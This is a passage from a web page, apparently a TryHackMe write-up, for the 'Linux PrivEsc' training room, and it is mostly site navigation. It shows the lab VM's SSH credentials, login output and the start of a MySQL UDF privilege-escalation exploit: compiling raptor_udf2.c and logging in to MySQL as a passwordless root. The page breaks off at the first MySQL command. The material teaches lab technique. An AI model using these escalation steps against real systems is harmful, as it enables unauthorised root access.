menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Challenges/">Linux Challenges</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Local Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Linux PrivEsc</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux PrivEsc</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Linux PrivEsc</h1><p>Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321</p><p><a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener noreferrer">Linux PrivEsc</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-we-will-cover--the-topics">💢 We will cover  the topics<a href="#-we-will-cover--the-topics" class="hash-link" aria-label="Direct link to 💢 We will cover  the topics" title="Direct link to 💢 We will cover  the topics">​</a></h2><ul><li>Misconfigured Services</li><li>Exploiting Writeable</li><li>Brute Forcing Hash</li><li>Misconfigured Binaries</li><li>Exploiting PATH Variable</li><li>Exploiting Crontab</li><li>Abusing SUID/GUID</li><li>Linux Enumeration</li><li>Stored Passwords &amp; Keys</li><li>NFS Enumaration</li><li>Kernel Exploits</li></ul><hr><h2 class="anchor anchorWithStickyNavbar_LWe7" id="deploy-the-vulnerable-debian-vm">Deploy the Vulnerable Debian VM<a href="#deploy-the-vulnerable-debian-vm" class="hash-link" aria-label="Direct link to Deploy the Vulnerable Debian VM" title="Direct link to Deploy the Vulnerable Debian VM">​</a></h2><p>This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his <a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener noreferrer">local privilege escalation workshop</a> but has been updated by <a href="https://twitter.com/TibSec" target="_blank" rel="noopener noreferrer">Tib3rius</a> as part of his <a href="https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06" target="_blank" rel="noopener noreferrer">Linux Privilege Escalation for OSCP</a> and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.</p><p><strong>Make sure you are connected to the <a href="https://tryhackme.com/access" target="_blank" rel="noopener noreferrer">TryHackMe VPN</a> or using the in-browser Kali instance before trying to access the Debian VM!</strong></p><p>SSH should be available on port 22. You can login to the &quot;user&quot; account using the following command:</p><p><code>ssh user@MACHINE_IP</code></p><p>If you see the following message: &quot;Are you sure you want to continue connecting (yes/no)?&quot; type yes and press Enter.</p><p>The password for the &quot;user&quot; account is &quot;<strong>password321</strong>&quot;.</p><p>The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. <strong>Remember to exit out of the shell and/or re-establish a session as the &quot;user&quot; account before starting the next task!</strong></p><ol><li>Deploy the machine and login to the &quot;user&quot; account using SSH.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh user@10.10.187.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The authenticity of host &#x27;10.10.187.8 (10.10.187.8)&#x27; can&#x27;t be established.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Warning: Permanently added &#x27;10.10.187.8&#x27; (RSA) to the list of known hosts.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@10.10.187.8&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The programs included with the Debian GNU/Linux system are free software;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">the exact distribution terms for each program are described in the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">individual files in /usr/share/doc/*/copyright.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">permitted by applicable law.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last login: Fri May 15 06:41:23 2020 from 192.168.1.125</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="2"><li>Run the &quot;id&quot; command. What is the result?</li></ol><p><code>uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="service-exploits">Service Exploits<a href="#service-exploits" class="hash-link" aria-label="Direct link to Service Exploits" title="Direct link to Service Exploits">​</a></h2><p>The MySQL service is running as root and the &quot;root&quot; user for the service does not have a password assigned. We can use a <a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener noreferrer">popular exploit</a> that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.</p><p>Change into the /home/user/tools/mysql-udf directory:</p><p><code>cd /home/user/tools/mysql-udf</code></p><p>Compile the raptor_udf2.c exploit code using the following commands:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc -g -c raptor_udf2.c -fPIC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Connect to the MySQL service as the root user with a blank password:</p><p><code>mysql -u root</code></p><p>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) &quot;do_system&quot; using our compiled exploit:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">use mysql;</span><br></span><span class="token-line" 